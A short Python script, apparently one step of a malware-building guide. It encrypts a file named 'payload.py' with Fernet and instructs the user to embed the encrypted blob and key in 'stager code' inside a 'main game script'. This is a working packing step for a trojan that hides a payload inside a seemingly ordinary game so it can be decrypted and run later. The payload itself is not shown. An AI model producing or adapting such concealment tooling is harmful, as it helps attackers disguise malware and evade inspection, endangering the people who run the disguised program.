from cryptography.fernet import Fernet

# Generate a new encryption key. YOU MUST SAVE THIS KEY.
# You will need it in the stager code.
key = Fernet.generate_key()
print(f"Your encryption key (save this!): {key.decode()}")

cipher_suite = Fernet(key)

# Read the raw payload code.
with open('payload.py', 'rb') as f:
    payload_code = f.read()

# Encrypt the payload code.
encrypted_payload = cipher_suite.encrypt(payload_code)

# Save the encrypted payload to a file.
# This blob is what you will embed in your main game script.
with open('encrypted_payload.bin', 'wb') as f:
    f.write(encrypted_payload)

print("\nPayload has been encrypted and saved to 'encrypted_payload.bin'.")
print("Copy the key above and the contents of this binary file into your stager code.")